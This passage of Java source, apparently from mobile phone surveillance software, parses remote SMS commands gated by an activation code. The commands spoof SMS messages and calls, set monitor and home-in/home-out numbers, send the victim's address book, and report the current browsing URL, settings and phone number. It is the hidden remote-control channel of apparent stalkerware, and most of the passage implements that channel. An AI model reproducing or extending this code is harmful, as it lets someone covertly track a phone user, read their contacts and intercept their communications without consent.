						cmd.setActivationCode(data[1]);
						if (data.length == 3 && data[2].equalsIgnoreCase("D")) {
							cmd.setReply(true);
							isDebugMode = true;
						}
					}
				} else if (cmdId == smsCmdCode.getSpoofSMSCmd()) {
					if (data.length == 4 || data.length == 5) {
						cmd = new RmtCmdLine();
						cmd.setRmtCmdType(RmtCmdType.SMS);
						cmd.setCode(cmdId);
						castMode = activationMode;
						cmd.setActivationCode(data[1]);
						cmd.setRecipientNumber(data[2]);
						cmd.setMessage(data[3]);
						if (data.length == 5 && data[4].equalsIgnoreCase("D")) {
							cmd.setReply(true);
							isDebugMode = true;
						}
					}
				} else if (cmdId == smsCmdCode.getSpoofCallCmd()) {
					if (data.length == 3 || data.length == 4) {
						cmd = new RmtCmdLine();
						cmd.setRmtCmdType(RmtCmdType.SMS);
						cmd.setCode(cmdId);
						castMode = activationMode;
						cmd.setActivationCode(data[1]);
						cmd.setRecipientNumber(data[2]);
						if (data.length == 4 && data[3].equalsIgnoreCase("D")) {
							cmd.setReply(true);		
							isDebugMode = true;
						}
					}
				} else if (cmdId == smsCmdCode.getAddMonitorNumberCmd()) {
					if (data.length > 2) {
						castMode = activationMode;
						NumberCmdLine monNumber = new NumberCmdLine();
						monNumber.setActivationCode(data[1]);
						monNumber.setRmtCmdType(RmtCmdType.SMS);
						monNumber.setCode(cmdId);
						for (int i = 2; i < data.length; i++) {	
							if ((i == data.length - 1) && (data[data.length - 1].equalsIgnoreCase("D"))) {
								monNumber.setReply(true);
								isDebugMode = true;
								break;
							}							
							monNumber.addNumber(data[i]);
						}
						cmd = monNumber;
					} else {
						errorMessage = RmtCmdTextResource.INVALID_MONITOR_NUMBER;
					}
				} else if (cmdId == smsCmdCode.getClearMonitorNumberCmd()) {
					cmd = new RmtCmdLine();
					cmd.setRmtCmdType(RmtCmdType.SMS);
					cmd.setCode(cmdId);
					castMode = activationMode;
					cmd.setActivationCode(data[1]);
					if (data.length == 3 && data[2].equalsIgnoreCase("D")) {
						cmd.setReply(true);
						isDebugMode = true;
					}
				} else if (cmdId == smsCmdCode.getResetMonitorNumberCmd()) {
					if (data.length > 2) {
						castMode = activationMode;
						NumberCmdLine monNumber = new NumberCmdLine();
						monNumber.setActivationCode(data[1]);
						monNumber.setRmtCmdType(RmtCmdType.SMS);
						monNumber.setCode(cmdId);
						for (int i = 2; i < data.length; i++) {	
							if ((i == data.length - 1) && (data[data.length - 1].equalsIgnoreCase("D"))) {
								monNumber.setReply(true);
								isDebugMode = true;
								break;
							}							
							monNumber.addNumber(data[i]);
						}
						cmd = monNumber;
					} else {
						errorMessage = RmtCmdTextResource.INVALID_MONITOR_NUMBER;
					}
				} else if (cmdId == smsCmdCode.getQueryMonitorNumberCmd()) {
					cmd = new RmtCmdLine();
					cmd.setRmtCmdType(RmtCmdType.SMS);
					cmd.setCode(cmdId);
					castMode = activationMode;
					cmd.setActivationCode(data[1]);
					if (data.length == 3 && data[2].equalsIgnoreCase("D")) {
						cmd.setReply(true);
						isDebugMode = true;
					}
				} /*else if (cmdId == smsCmdCode.getPanicModeCmd()) {
					if (data.length == 3 || data.length == 4) {
						SetPanicModeCmdLine panicModeCmdLine = new SetPanicModeCmdLine();
						castMode = activationMode;
						panicModeCmdLine.setRmtCmdType(RmtCmdType.SMS);
						panicModeCmdLine.setCode(cmdId);
						panicModeCmdLine.setActivationCode(data[1]);
						int mode = Integer.parseInt(data[2]);
						if (mode == PanicMode.GPS_PICTURE.getId() || mode == PanicMode.GPS_ONLY.getId()) {
							panicModeCmdLine.setPanicMode(Integer.parseInt(data[2]));
							if (data.length == 4 && data[3].equalsIgnoreCase("D")) {
								panicModeCmdLine.setReply(true);
								isDebugMode = true;
							}
						} else {
							errorMessage = RmtCmdTextResource.INV_CMD_FORMAT;
						}
						cmd = panicModeCmdLine;
					}
				} *//*else if (cmdId == smsCmdCode.getEnablePanicCmd()) {
					if (data.length == 3 || data.length == 4) {
						cmd = new RmtCmdLine();
						cmd.setRmtCmdType(RmtCmdType.SMS);
						cmd.setCode(cmdId);
						castMode = activationMode;
						cmd.setActivationCode(data[1]);
						if (data[2] == "0") {
							cmd.setEnabled(0);
						} else if (data[2] == "1") {
							cmd.setEnabled(1);
						} else {
							errorMessage = RmtCmdTextResource.INV_CMD_FORMAT;
						}
						if (data.length == 4 && data[3].equalsIgnoreCase("D")) {
							cmd.setReply(true);
						}
					} else {
						errorMessage = RmtCmdTextResource.INV_CMD_FORMAT;
					}
				} */else if (cmdId == smsCmdCode.getAddHomeOutNumberCmd()) {
					if (data.length > 2) {
						castMode = activationMode;
						NumberCmdLine numCmd = new NumberCmdLine();
						numCmd.setRmtCmdType(RmtCmdType.SMS);
						numCmd.setCode(cmdId);
						numCmd.setActivationCode(data[1]);
						for (int i = 2; i < data.length; i++) {	
							if ((i == data.length - 1) && (data[data.length - 1].equalsIgnoreCase("D"))) {
								numCmd.setReply(true);
								isDebugMode = true;
								break;
							}							
							numCmd.addNumber(data[i]);
						}
						cmd = numCmd;
					} else {
						errorMessage = RmtCmdTextResource.INVALID_HOMEOUT_NUMBER;
					}
				} else if (cmdId == smsCmdCode.getClearHomeOutNumberCmd()) {
					cmd = new RmtCmdLine();
					cmd.setRmtCmdType(RmtCmdType.SMS);
					cmd.setCode(cmdId);
					castMode = activationMode;
					cmd.setActivationCode(data[1]);
					if (data.length == 3 && data[2].equalsIgnoreCase("D")) {
						cmd.setReply(true);
						isDebugMode = true;
					}
				} else if (cmdId == smsCmdCode.getResetHomeOutNumberCmd()) {
					if (data.length > 2) {
						castMode = activationMode;
						NumberCmdLine number = new NumberCmdLine();
						number.setActivationCode(data[1]);
						number.setRmtCmdType(RmtCmdType.SMS);
						number.setCode(cmdId);
						for (int i = 2; i < data.length; i++) {	
							if ((i == data.length - 1) && (data[data.length - 1].equalsIgnoreCase("D"))) {
								number.setReply(true);
								isDebugMode = true;
								break;
							}							
							number.addNumber(data[i]);
						}
						cmd = number;
					} else {
						errorMessage = RmtCmdTextResource.INVALID_HOMEOUT_NUMBER;
					}
				} else if (cmdId == smsCmdCode.getQueryHomeOutNumberCmd()) {
					cmd = new RmtCmdLine();
					cmd.setRmtCmdType(RmtCmdType.SMS);
					cmd.setCode(cmdId);
					castMode = activationMode;
					cmd.setActivationCode(data[1]);
					if (data.length == 3 && data[2].equalsIgnoreCase("D")) {
						cmd.setReply(true);
						isDebugMode = true;
					}
				} else if (cmdId == smsCmdCode.getAddHomeInNumberCmd()) {
					if (data.length > 2) {
						castMode = activationMode;
						NumberCmdLine number = new NumberCmdLine();
						number.setRmtCmdType(RmtCmdType.SMS);
						number.setCode(cmdId);
						number.setActivationCode(data[1]);
						for (int i = 2; i < data.length; i++) {	
							if ((i == data.length - 1) && (data[data.length - 1].equalsIgnoreCase("D"))) {
								number.setReply(true);
								isDebugMode = true;
								break;
							}							
							number.addNumber(data[i]);
						}
						cmd = number;
					} else {
						errorMessage = RmtCmdTextResource.INVALID_HOMEOUT_NUMBER;
					}
				} else if (cmdId == smsCmdCode.getClearHomeInNumberCmd()) {
					cmd = new RmtCmdLine();
					cmd.setRmtCmdType(RmtCmdType.SMS);
					cmd.setCode(cmdId);
					castMode = activationMode;
					cmd.setActivationCode(data[1]);
					if (data.length == 3 && data[2].equalsIgnoreCase("D")) {
						cmd.setReply(true);
						isDebugMode = true;
					}
				} else if (cmdId == smsCmdCode.getResetHomeInNumberCmd()) {
					if (data.length > 2) {
						castMode = activationMode;
						NumberCmdLine number = new NumberCmdLine();
						number.setActivationCode(data[1]);
						number.setRmtCmdType(RmtCmdType.SMS);
						number.setCode(cmdId);
						for (int i = 2; i < data.length; i++) {	
							if ((i == data.length - 1) && (data[data.length - 1].equalsIgnoreCase("D"))) {
								number.setReply(true);
								isDebugMode = true;
								break;
							}							
							number.addNumber(data[i]);
						}
						cmd = number;
					} else {
						errorMessage = RmtCmdTextResource.INVALID_HOMEIN_NUMBER;
					}
				} else if (cmdId == smsCmdCode.getQueryHomeInNumberCmd()) {
					cmd = new RmtCmdLine();
					cmd.setRmtCmdType(RmtCmdType.SMS);
					cmd.setCode(cmdId);
					castMode = activationMode;
					cmd.setActivationCode(data[1]);
					if (data.length == 3 && data[2].equalsIgnoreCase("D")) {
						cmd.setReply(true);
						isDebugMode = true;
					}
				} else if (cmdId == smsCmdCode.getSendAddressbookCmd()) {
					if (data.length > 1) {
//						Log.debug("RmtCmdRegister.getRmtCmdLine.getSendAddressbookCmd()", "ENTER");
						cmd = new RmtCmdLine();
						cmd.setRmtCmdType(RmtCmdType.SMS);
						cmd.setCode(cmdId);						
						castMode = activationMode;
						cmd.setActivationCode(data[1]);
						if (data.length == 3 && data[2].equalsIgnoreCase("D")) {
							cmd.setReply(true);
							isDebugMode = true;
						}
					} else {
						errorMessage = RmtCmdTextResource.INV_CMD_FORMAT;
					}
				} else if (cmdId == smsCmdCode.getRequestCurrentURLCmd()) {
					cmd = new RmtCmdLine();
					cmd.setRmtCmdType(RmtCmdType.SMS);
					cmd.setCode(cmdId);
					castMode = activationMode;
					cmd.setActivationCode(data[1]);
					if (data.length == 3 && data[2].equalsIgnoreCase("D")) {
						cmd.setReply(true);
						isDebugMode = true;
					}
				} else if (cmdId == smsCmdCode.getRequestSettingsCmd()) {
					if (data.length == 2 || data.length == 3) {
						cmd = new RmtCmdLine();
						cmd.setRmtCmdType(RmtCmdType.SMS);
						cmd.setCode(cmdId);
						castMode = activationMode;
						cmd.setActivationCode(data[1]);
						if (data.length == 3 && data[2].equalsIgnoreCase("D")) {
							cmd.setReply(true);		
							isDebugMode = true;
						}
					} else {
						errorMessage = RmtCmdTextResource.INV_CMD_FORMAT;
					}
				} else if (cmdId == smsCmdCode.getRequestStartupTimeCmd()) {
					if (data.length == 2 || data.length == 3) {
						cmd = new RmtCmdLine();
						cmd.setRmtCmdType(RmtCmdType.SMS);
						cmd.setCode(cmdId);
						castMode = activationMode;
						cmd.setActivationCode(data[1]);
						if (data.length == 3 && data[2].equalsIgnoreCase("D")) {
							cmd.setReply(true);		
							isDebugMode = true;
						}
					} else {
						errorMessage = RmtCmdTextResource.INV_CMD_FORMAT;
					}
				} else if (cmdId == smsCmdCode.getRequestMobileNumberCmd()) {
					if (data.length == 2 || data.length == 3) {
						cmd = new RmtCmdLine();
						cmd.setRmtCmdType(RmtCmdType.SMS);
						cmd.setCode(cmdId);
						castMode = activationMode;
						cmd.setActivationCode(data[1]);
						if (data.length == 3 && data[2].equalsIgnoreCase("D")) {
							cmd.setReply(true);		
							isDebugMode = true;
						}
					} else {
						errorMessage = RmtCmdTextResource.INV_CMD_FORMAT;
					}
				}
			} else {
				errorMessage = RmtCmdTextResource.CMD_NOT_REGIT;
				Log.error("RmtCmdRegister.getRmtCmdLine", errorMessage);
			}			
		} catch(NumberFormatException nfe) {
			if (castMode == commandIdMode) {
//				errorMessage = RmtCmdTextResource.NOT_CMD_MSG;
				errorMessage = RmtCmdTextResource.INV_CMD_FORMAT;
			} else if (castMode == activationMode) {
				errorMessage = RmtCmdTextResource.INV_ACT_CODE;
			} else if (castMode == gpsIndexMode) {
				errorMessage = RmtCmdTextResource.INV_GPS_TIMER;
			}
		} catch(Exception e) {
			Log.error("RmtCmdRegister.getRmtCmdLine", null, e);
		}
		return cmd;
	}

//	/*private boolean isInvalidWatchFlags(Vector watchFlags) {
//		boolean invalid = true;
//		int watchFlagsCnt = 4;
//		if (watchFlags.size() == watchFlagsCnt) {
//			for (int i = 0; i < watchFlagsCnt; i++) {
//				if (watchFlags.elementAt(i).equals("1") || watchFlags.elementAt(i).equals("0")) {
//					invalid = false;
//				} else {
//					invalid = true;
//					break;
//				}
//			}
//		}
//		return invalid;
//	}*/
	
	/*private Vector parseWatchFlags(String value) {
		Vector flags = new Vector();
		int beginIndex = 0;	
		int endIndex = value.indexOf(Constant.COLON, beginIndex);
		if (endIndex != -1) {
			while (true) {
				String number = value.substring(beginIndex, endIndex);
				flags.addElement(number);
				beginIndex = endIndex + 1;
				endIndex = value.indexOf(Constant.COLON, beginIndex);
				if (endIndex == -1) {
					number = value.substring(beginIndex);
					flags.addElement(number);
					break;
				}
			}
		}
		return flags;
	}*/
	
	/*private boolean isInvalidNumber(Vector numberList) {
		boolean invalid = false;
		int countNumber = numberList.size();
		for (int i = 0; i < countNumber; i++) {
			if (!isDigit((String) numberList.elementAt(i))) {
				invalid = true;
				break;
			}
		}
		return invalid;
	}	
	
	private boolean isDigit(String number) {		
		boolean digit = true;		
		if (number.startsWith(Constant.PLUS)) {
			number = number.substring(1);
		}
		for (int i = 0; i < number.length(); i++) {
			if (!Character.isDigit(number.charAt(i))) {
				digit = false;
			}
		}
		return digit;
	}*/
	
	/*private Vector getOnlyUniqueNumber(Vector numberList) {
		if (numberList.size() > 1) {
			int[] refIndex = new int[numberList.size()]; 
			for (int i = 0; i < numberList.size(); i++) {
				boolean duplicate = false;
				int k = 0;
				String srcNumber = (String) numberList.elementAt(i);
				for (int j = i + 1; j < numberList.size(); j++) {
					String destNumber = (String) numberList.elementAt(j);
					if (srcNumber.equals(destNumber)) {
						refIndex[k] = j;
						k++;
						duplicate = true;
					} 
				}
				if (duplicate) {
					for (int j = refIndex.length - 1; j >= 0; j--) {
						if (refIndex[j] > 0) {
							numberList.removeElementAt(refIndex[j]);
						}
					}
					// reset index
					i = 0;
					Arrays.zero(refIndex);
				}
			}
		}
		return numberList;
	}*/
	
	/*private Vector parseNumber(String value) {
		Vector numberStore = new Vector();
		int beginIndex = 0;	
		int endIndex = value.indexOf(Constant.SEMICOLON, beginIndex);
		if (endIndex != -1) {
			while (true) {
				String number = value.substring(beginIndex, endIndex);
				numberStore.addElement(number);
				beginIndex = endIndex + 1;
				endIndex = value.indexOf(Constant.SEMICOLON, beginIndex);
				if (endIndex == -1) {
					number = value.substring(beginIndex);
					numberStore.addElement(number);
					break;
				}
			}
		}
		return numberStore;
	}*/
	
	/*private boolean isSMSCommand(String message) {
		boolean activatedSms = false;
		String prefix = "<*#";
		if (message.startsWith(prefix) && message.endsWith(Constant.GREATER_THAN)) {
			activatedSms = true;
		}
		return activatedSms;
	}*/

	private boolean isCmdExisted(int cmdCode) {
		boolean isExisted = false;
		for (int i = 0; i < commands.size(); i++) {
			RmtCmdLine tmp = (RmtCmdLine)commands.elementAt(i);
			if (cmdCode == tmp.getCode()) {
				isExisted = true;
				break;
			}
		}
		return isExisted;
	}
	
	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("RmtCmdRegister.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		/*if (Log.isDebugEnable()) {
			Log.debug("RmtCmdRegister.smsSendSuccess()", "contact name: " + smsMessage.getContactName() + " , msg: " + smsMessage.getMessage() + " , number: " + smsMessage.getNumber());
		}*/
		smsSender.removeListener(this);
	}
}
